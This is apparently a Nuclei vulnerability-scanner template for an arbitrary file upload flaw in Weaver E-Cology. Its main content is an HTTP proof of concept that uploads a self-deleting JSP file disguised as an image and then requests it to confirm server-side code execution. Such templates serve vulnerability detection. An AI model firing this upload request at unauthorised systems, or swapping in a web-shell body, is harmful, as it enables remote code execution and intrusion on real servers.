# Nuclei Template: Weaver E-Cology KtreeUploadAction - Arbitrary File Upload
**Template ID:** weaver-ktreeuploadaction-file-upload
**Vulnerability Class:** Unrestricted Upload of File with Dangerous Type
**Severity:** Critical
**CWE:** CWE-434
**Source:** Nuclei Template (`weaver-ktreeuploadaction-file-upload.yaml`)

## Vulnerability Information & PoC

## Description
There is a file upload vulnerability in Weaver E-Cology. An attacker can upload any file through KtreeUploadAction.jsp and further exploit it.

## Steps to reproduce / Exploit Payload
```http
@timeout: 20s
POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywgljfvib

------WebKitFormBoundarywgljfvib
Content-Disposition: form-data; name="test"; filename="{{randstr}}.jsp"
Content-Type: image/jpeg

<%out.print({{num1}} * {{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundarywgljfvib--

@timeout: 20s
GET {{filename}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://buaq.net/go-117479.html
